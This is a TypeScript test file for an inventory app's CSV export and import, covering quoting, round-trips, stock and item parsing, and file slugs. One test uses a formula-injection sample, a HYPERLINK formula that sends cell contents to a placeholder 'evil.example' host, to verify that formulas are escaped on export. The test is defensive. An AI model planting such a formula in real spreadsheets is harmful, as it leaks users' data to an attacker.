import assert from "node:assert/strict";
import { test } from "node:test";
import { fileSlug, toCsv } from "./csv";
import { tokenize } from "./import-table";
import { parseItemsText } from "./import-items";
import { parseStockText } from "./import-stock";

test("toCsv quotes only what needs it and round-trips through tokenize", () => {
  const rows = [
    ["name", "unit", "sku", "category"],
    ["Çimento 50kg", "thes", "NDR-1", null],
    ['Vida "torx" 4x40; e zezë', "paketë", "", "Vegla\nkuti"],
    [12, "m", undefined, ""],
  ];
  const csv = toCsv(rows);
  assert.ok(csv.startsWith("﻿"), "UTF-8 BOM for Excel");
  assert.equal(csv.split("\r\n")[1], "Çimento 50kg;thes;NDR-1;");
  assert.equal(csv.split("\r\n")[2], '"Vida ""torx"" 4x40; e zezë";paketë;;"Vegla\nkuti"');
  const back = tokenize(csv.slice(1), ";");
  assert.deepEqual(
    back.map((r) => r.cells),
    [
      ["name", "unit", "sku", "category"],
      ["Çimento 50kg", "thes", "NDR-1", ""],
      ['Vida "torx" 4x40; e zezë', "paketë", "", "Vegla\nkuti"],
      ["12", "m", "", ""],
    ],
  );
});

test("an items export is an items import with no errors; a stock export is a stock import", () => {
  const items = parseItemsText(toCsv([["name", "unit", "sku", "category"], ["Çimento 50kg", "thes", "NDR-1", "Çimento"], ["Vida", "paketë", "", ""]]));
  assert.deepEqual(items.errors, []);
  assert.equal(items.hasHeader, true);
  assert.deepEqual(items.rows.map((r) => [r.name, r.unit, r.sku, r.category]), [["Çimento 50kg", "thes", "NDR-1", "Çimento"], ["Vida", "paketë", null, null]]);

  // The stock export carries a readable `name` next to `item`; the
  // import takes the first header that means "item" and ignores the rest.
  const stock = parseStockText(toCsv([["item", "name", "location", "quantity"], ["NDR-1", "Çimento 50kg", "A-01-1-1", 40], ["Vida", "Vida", "A-01-1-2", 1200]]));
  assert.deepEqual(stock.errors, []);
  assert.deepEqual(stock.rows.map((r) => [r.item, r.location, r.quantity]), [["NDR-1", "A-01-1-1", 40], ["Vida", "A-01-1-2", 1200]]);
});

test("a cell Excel would run as a formula is exported as text", () => {
  const csv = toCsv([
    ["name", "unit"],
    ['=HYPERLINK("https://evil.example/?c="&A1,"Kliko")', "copë"],
    ["=1+1", "copë"],
    ["+383 44 123 456", "copë"],
    ["@sum", "copë"],
    ["-40C kabllo", "copë"],
    ["\tskeda", "copë"],
    ["Çimento 50kg", "copë"],
  ]);
  const cells = tokenize(csv.slice(1), ";").map((r) => r.cells[0]);

  // Every formula starter is shielded on the way out...
  const lines = csv.split("\r\n");
  assert.equal(lines[2], "'=1+1;copë");
  assert.equal(lines[3], "'+383 44 123 456;copë");
  assert.equal(lines[4], "'@sum;copë");
  assert.equal(lines[5], "'-40C kabllo;copë");

  // ...and taken back off on the way in, so an export still re-imports as
  // what it was. This is the promise the module comment makes.
  assert.deepEqual(cells, [
    "name",
    '=HYPERLINK("https://evil.example/?c="&A1,"Kliko")',
    "=1+1",
    "+383 44 123 456",
    "@sum",
    "-40C kabllo",
    "\tskeda",
    "Çimento 50kg",
  ]);
});

test("an apostrophe that isn't shielding a formula is left alone", () => {
  const csv = toCsv([["name"], ["'Speciali'"], ["l'artikull"]]);
  const cells = tokenize(csv.slice(1), ";").map((r) => r.cells[0]);
  assert.deepEqual(cells, ["name", "'Speciali'", "l'artikull"]);
});

test("fileSlug strips diacritics and punctuation", () => {
  assert.equal(fileSlug("Fabrika Prizren"), "fabrika-prizren");
  assert.equal(fileSlug("Depo Fushë Kosovë (2)"), "depo-fushe-kosove-2");
  assert.equal(fileSlug("???"), "export");
});
